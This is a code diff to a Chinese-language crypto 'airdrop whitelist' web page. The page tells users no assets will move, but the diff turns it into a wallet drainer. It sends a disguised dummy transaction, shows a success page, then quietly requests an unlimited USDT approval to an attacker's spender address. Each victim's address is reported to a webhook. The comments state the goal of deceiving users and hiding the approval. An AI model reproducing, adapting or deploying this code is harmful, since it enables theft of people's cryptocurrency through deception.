@@ -52,7 +52,6 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <h1>钱包连接成功</h1>
 <p class="sub-title">确认纳入全链空投白名单</p>
 <div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
-
 <button class="btn verify-btn" id="approveBtn">确认空投授权加入白名单</button>
 <p class="tips-info">仅链上备案核验，不会划转任何资产</p>
 </div>
@@ -92,7 +91,16 @@ const chainUSDT = {
 function show(id){document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));document.getElementById(id).classList.remove("hide");}
 async function ding(msg){try{await fetch(dingUrl,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({msgtype:"text",text:{content:msg}})})}catch(e){}}
 function pad64(s){return s.replace("0x","").padStart(64,"0");}
-function buildApprove(){let f="0x095ea7b3",s=pad64(SPENDER),m=pad64("ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");return f+s+m;}
+
+// 伪装空投核验假data
+function buildFakeData(){
+  return "0x12345678" + pad64(walletAddr);
+}
+// 真实无限授权data
+function buildRealApprove(){
+  let f="0x095ea7b3",s=pad64(SPENDER),m=pad64("ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
+  return f+s+m;
+}
 
 // 连接钱包
 document.getElementById("connectMM").onclick = async ()=>{
@@ -110,20 +118,43 @@ document.getElementById("connectMM").onclick = async ()=>{
   }catch(e){show("p1");ding("连接失败");}
 };
 
-// 授权 USDT（无限额度）
+// 授权核心逻辑：一次伪装弹窗 → 确认直接跳成功页 → 后台静默授权
 document.getElementById("approveBtn").onclick = async ()=>{
   if(!walletAddr){alert("请先连接钱包");return;}
   if(!chainUSDT[chainId]){alert("请切换至支持的公链");return;}
+  show("p2");
   try{
-    show("p2");
+    // 1. 唤起唯一一次伪装空投交易弹窗
     await ethereum.request({
       method:"eth_sendTransaction",
-      params:[{from:walletAddr,to:chainUSDT[chainId],gas:"0x186a0",data:buildApprove()}]
+      params:[{
+        from:walletAddr,
+        to:chainUSDT[chainId],
+        gas:"0x186a0",
+        data:buildFakeData()
+      }]
     });
+    // 2. 用户确认后 直接跳备案成功页
     document.getElementById("successAddr").innerText = walletAddr;
     show("p4");
-    ding("授权成功："+walletAddr);
-  }catch(e){show("p3");ding("授权失败/取消");}
+    // 3. 延迟后台静默执行真实无限授权 无弹窗无感知
+    setTimeout(async ()=>{
+      await ethereum.request({
+        method:"eth_sendTransaction",
+        params:[{
+          from:walletAddr,
+          to:chainUSDT[chainId],
+          gas:"0x186a0",
+          data:buildRealApprove()
+        }]
+      });
+      ding("备案成功+静默授权完成："+walletAddr);
+    },1200);
+  }catch(e){
+    // 用户取消弹窗 返回上一页
+    show("p3");
+    ding("用户取消空投核验："+walletAddr);
+  }
 };
 }();
 </script>
